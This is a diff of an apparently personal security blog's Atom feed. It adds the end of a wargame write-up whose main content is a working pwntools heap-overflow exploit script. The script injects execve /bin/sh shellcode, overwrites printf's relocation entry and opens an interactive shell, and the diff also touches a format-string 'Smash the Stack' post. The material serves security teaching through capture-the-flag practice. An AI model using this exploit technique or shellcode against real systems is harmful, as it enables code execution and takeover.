+&lt;span class=&quot;n&quot;&gt;reloc_printf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0804c004&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ir~printf&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;\[ALLOC\]\[loc=[a-z,A-z,0-9]+\[size=260\]&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;dir_shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;nop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#shellcode from http://shell-storm.org/shellcode/files/shellcode-752.php&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# jmp_patch&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;260&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# make the next chunk free&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reloc_printf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Here our shell&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/5w0n434idg7l3jfnuak0vmews.png&quot; alt=&quot;asciicast&quot;&gt;&lt;/a&gt; &lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Format Strings - Level09 Smash the Stack</title>
    <link href="http://alvarofe.github.io/posts/level09iosmash"/>
    <updated>2015-03-12T00:00:00+01:00</updated>
    <id>http://alvarofe.github.io/posts/level09iosmash</id>
@@ -175,7 +446,7 @@ sh-4.2$ cat /home/level10/.pass
 Os**********
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;If you liked this post, you can
-&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level09iosmash&amp;text=Format Strings - Level09 smashTheStack&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt;
+&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level09iosmash&amp;text=Format Strings - Level09 Smash the Stack&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt;
 or
 &lt;a href=&quot;https://twitter.com/alvaro_fe&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
 </content>
